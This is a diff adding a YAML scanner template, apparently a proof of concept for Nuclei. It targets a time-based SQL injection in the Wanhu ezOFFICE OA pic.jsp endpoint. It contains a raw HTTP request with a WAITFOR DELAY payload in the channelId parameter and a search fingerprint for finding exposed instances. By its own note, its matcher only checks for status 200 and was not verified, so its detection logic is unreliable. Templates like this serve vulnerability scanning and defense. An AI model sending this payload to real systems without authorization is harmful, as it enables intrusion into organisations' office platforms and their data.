@@ -1,0 +1,37 @@
+id: poc-ac19235dcd8812e78460
+info:
+  name: 万户协同办公平台ezofficepic存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ac19235dcd8812e78460abaa531232cd
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ac19235dcd8812e78460abaa531232cd
+    fofa: + hunter`app.name="万户 Ezoffice OA"`
+http:
+- raw:
+  - 'GET /defaultroot/platform/portal/portlet/pic/pic.jsp?num=1&channelId=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:122.0) Gecko/20100101 Firefox/122.0
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Cookie: OASESSIONID=46B0991723119BE2033078E05CE02503; LocLan=zh_CN
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
